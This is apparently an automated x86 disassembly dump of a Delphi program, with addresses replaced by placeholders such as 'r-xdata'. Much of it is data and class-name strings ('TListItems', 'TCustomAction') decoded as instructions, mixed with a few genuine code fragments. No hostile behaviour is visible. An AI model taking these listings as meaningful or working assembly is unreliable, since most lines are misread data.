add [ eax ] al
adc [ eax ] eax
add [ ecx ] dl
inc eax
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
adc [ eax ] al
mov eax eax
sub ch bh
inc esi
insd
add [ eax ] cl
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push 0x65
popad
jbe r-xdata
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
push eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
hlt
add [ gs : edx ] al
insd
arpl [ edx + ecx + 0x7 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
je r-xdata
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ esp + edi * 8 + 0x19080046 ] ch
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
outsb
inc edx
mov eax 0xc80046f8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
jae r-xdata
je r-xdata
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
dec eax
clc
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
pop es
inc ecx
push ebx
outsb
jb r-xdata
add al 0x8
nop
push 0x80046fc
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
inc esi
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
popad
jb r-xdata
or [ fs : ecx + 0x44 ] ecx
je r-xdata
inc esi
outsd
jb r-xdata
dec ecx
je r-xdata
insd
inc ecx
outsd
push es
insd
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
dec ecx
inc esp
dec edi
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push eax
jb r-xdata
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x1dbffc0 ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
fdiv st5
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
insd
push eax
jb r-xdata
jb r-xdata
inc ebx
jne r-xdata
insd
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
jl r-xdata
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jns r-xdata
insd
or al [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
push 0x61430601
outsd
outsb
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
popad
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc esp
jo r-xdata
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
add [ esi ] eax
arpl [ ecx + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
inc ebx
insb
outsd
jae r-xdata
insd
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax ] cl
adc al 0x54
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
inc esi
inc eax
add ah cl
adc [ eax ] al
xor al 0xff
inc esi
add [ eax ] cl
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
insb
insb
add [ ebx ] al
or [ edi ] al
jb r-xdata
jns r-xdata
dec ecx
je r-xdata
inc edx
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
aam 0xfe
inc esi
add [ eax ] cl
adc eax 0x73694454
push edx
jae r-xdata
jb r-xdata
je r-xdata
or [ 0x73694454 ] dl
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
mov eax eax
add al 0x4e
or [ edi ] al
inc ecx
push ebx
add [ edx ] al
jb r-xdata
pop es
push 0x6552080a
jae r-xdata
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x3fffc0 ] cl
inc esi
add [ eax ] cl
sbb eax 0x73694454
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
insd
aam 0x11
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
jns r-xdata
je r-xdata
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
js r-xdata
outsd
outsb
jae r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax ] dl
add [ edi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push es
je r-xdata
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
push ebx
outsb
push edx
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
outsd
jb r-xdata
insd
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
inc ecx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax - 0x1 ] bh
inc [ esi ]
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
adc [ eax ] eax
int3
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
or [ ecx + 0x44 ] ecx
inc ecx
push ebx
outsb
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add al [ esi + ecx * 2 ]
push esp
dec edi
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or [ ecx ] ah
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc edx
outsw
jb r-xdata
insd
push edi
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
insd
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esi ] eax
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edx ] bl
push esp
inc esp
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
rol [ ecx ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ eax ] bh
add al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
aam 0x0
add [ eax ] al
and al 0xe7
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
je r-xdata
inc ecx
je r-xdata
push ebx
inc ecx
je r-xdata
insd
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
popad
jbe r-xdata
add [ 0x73694454 ] cl
je r-xdata
add [ esi ] ah
add al [ edi ]
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
add ah cl
adc [ eax ] al
nop
sub [ ecx ] al
inc edi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add al [ es : edi ]
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
add ecx [ eax ]
pop es
je r-xdata
add [ ebx ] al
or [ edi ] al
inc esi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
dec edi
jo r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
cmp [ edx ] al
inc edi
add [ edi ] al
or eax 0x73694454
je r-xdata
inc esi
add [ eax + 0x8004700 ] bh
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ edi + 0x6e ] ecx
outsb
test al 0xfc
inc esi
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] cl
dec edi
imul esi [ ebx + 0x74 ] 0x6d657449
rol [ ecx ] 0x1
inc edi
add ah dl
out 0x46 eax
add [ 0x754f0900 ] dl
je r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f2 ] ah
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
pushfd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
add [ eax ] al
or [ ecx ] 0x0
je r-xdata
dec edi
outsd
outsd
imul ebx [ eax + 0x50 ] 0x10
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
inc edx
outsw
jb r-xdata
jns r-xdata
or [ ebx ] 0x0
push es
dec edi
fdivr st5
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
dec edi
add [ edi ] al
and dh bh
inc esi
add [ eax ] bh
add bh bh
js r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
outsb
inc ebx
jne r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xfd
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
je r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
outsb
push edx
popad
jo r-xdata
add [ eax ] al
inc [ esi ]
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
jo r-xdata
outsb
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
pop es
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
jns r-xdata
jo r-xdata
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
outsb
inc ecx
je r-xdata
add [ edi ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jb r-xdata
insb
insb
xor bh bh
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
push edx
jo r-xdata
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
mov ecx r-xdata
call sub_405a10
sbb [ eax + eax + 0x558b0000 ] 0xfffffffc
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
je r-xdata
inc [ esi ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
je r-xdata
add [ eax ] al
[ eax + 0x1ff0000 ]
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
add [ eax ] al
popad
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc ecx
je r-xdata
pushad
add [ edi ] al
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100012 ] al
outsb
jne r-xdata
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
mov esp 0xa80046ff
add [ eax ] al
[ eax + 0x1ff0000 ]
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
lea edx [ ebp - 0x4 ]
mov [ fs : eax ] edx
push sub_47053f
call 0xffffffff83d50510
pushfd
add [ eax ] al
add [ ebx + 0x44b9fc55 ] cl
add eax 0xeee80047
push esp
stc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
outsb
inc edx
and al 0x1
inc edi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
stc
inc ebx
jmp sub_4039a0
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
mov ah 0x0
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x4f06000b ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x65676e61
js r-xdata
js r-xdata
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
sub_46fa3c
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
inc ebx
jne r-xdata
outsb
je r-xdata
jns r-xdata
jo r-xdata
push eax
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
jb r-xdata
insb
insb
enter 0x46f6 0x0
cwde
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
inc ecx
je r-xdata
je r-xdata
arpl [ gs : ebx + 0x4e ] bp
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
push eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
or al 0xf7
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
test [ esi ] 0xff0000b0
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
je r-xdata
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
jae r-xdata
je r-xdata
outsw
jb r-xdata
popad
dec eax
clc
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
rol [ eax ] 0x0
popad
insd
jae r-xdata
inc ebx
push 0x4e6b6365
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc edx
outsw
jb r-xdata
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jns r-xdata
outsb
push edx
jo r-xdata
test [ esi ] 0x90
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000b ] al
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
push 0x65676e61
sbb ch dh
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
dec ecx
je r-xdata
outsd
push es
insd
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
inc esp
insb
je r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc ecx
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
hlt
test [ esi ] 0xff0000a8
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc cl [ edi + 0x6e ]
outsb
add [ edi ] al
mov esp 0x780046f5
add [ eax ] al
dec edi
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
jb r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
or al [ esi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
pop es
inc ecx
push ebx
outsb
jb r-xdata
add al 0x8
nop
push 0x80046fc
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
push 0x61430601
inc edx
outsd
outsd
insb
add ah cl
adc [ eax ] al
lodsb [ esi ]
cld
inc esi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
push edx
popad
or al 0xf6
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
or [ ebx ] 0x0
push es
dec edi
js r-xdata
or al [ edi ]
inc esi
outsd
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
or [ fs : ecx + 0x44 ] ecx
je r-xdata
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
jl r-xdata
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
dec ecx
inc esp
dec edi
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
adc [ eax ] eax
add [ ecx ] dl
inc eax
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
adc [ eax ] al
mov eax eax
sub ch bh
inc esi
insd
add [ eax ] cl
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
arpl [ ecx + eax + 0x6 ] si
push 0x65
popad
jbe r-xdata
outsb
inc esi
outsd
jb r-xdata
dec edi
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
inc esi
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
popad
jb r-xdata
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
fdiv st5
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
insd
push eax
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
insd
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax ] cl
adc al 0x54
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
inc esi
pop es
push 0x6552080a
jae r-xdata
add [ gs : edx ] al
insd
arpl [ edx + ecx + 0x7 ] si
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
je r-xdata
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ esp + edi * 8 + 0x19080046 ] ch
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
outsb
inc edx
mov eax 0xc80046f8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
